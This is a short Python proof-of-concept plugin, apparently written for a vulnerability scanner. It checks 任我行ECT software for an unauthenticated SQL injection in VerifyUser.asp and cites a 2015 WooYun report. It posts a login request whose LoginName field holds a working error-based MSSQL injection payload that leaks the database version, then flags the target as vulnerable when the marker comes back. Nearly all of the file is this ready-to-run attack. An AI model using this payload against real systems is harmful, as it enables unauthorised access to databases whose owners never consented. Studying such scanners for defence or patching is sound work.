#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : 任我行ECT存在SQL注入(无需登录) 
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0105065
"""
def assign(service, arg): 
    if service == "weway_soft": 
        return True, arg 
def audit(arg):
    payload ="VerifyUser.asp"
    data="LoginName=admin'%20AND%204996=CONVERT(INT,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version))%20AND%20'kmly'='kmly&Password=admin&Validatepwds=&LockNum=err&UserRank=0"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target,data)
    #print res
    if code!=0 and 'GAO JI@Microsoft SQL Server' in res: 
        security_hole(target) 

        return arg
if __name__== '__main__':
    from dummy import *
